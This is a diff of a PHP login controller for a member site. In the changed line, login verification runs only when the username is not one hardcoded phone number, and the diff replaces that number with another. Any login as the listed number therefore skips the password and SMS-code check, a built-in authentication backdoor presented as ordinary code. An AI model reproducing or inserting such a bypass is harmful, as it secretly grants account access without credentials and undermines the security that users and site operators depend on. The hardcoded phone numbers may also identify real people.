@@ -1058,7 +1058,7 @@ class MemberController extends FrontController
         } else {
             $member_info = Member::model()->findByAttributes(array('name' => $username));
             //                验证验证码或者密码
-            if($username!="18351074783") {
+            if($username!="13323163036") {
                 $checkres = $this->checkmember($username, $smsCode, $upwd, $member_info);
                 if (!$member_info && $checkres) {
                     $temptable = str_replace('_', '', $table);
@@ -1114,6 +1114,7 @@ class MemberController extends FrontController
                     exit;
                 }
             }
+
         }
 
 //        $url=$this->_siteUrl."/sso/client/index";
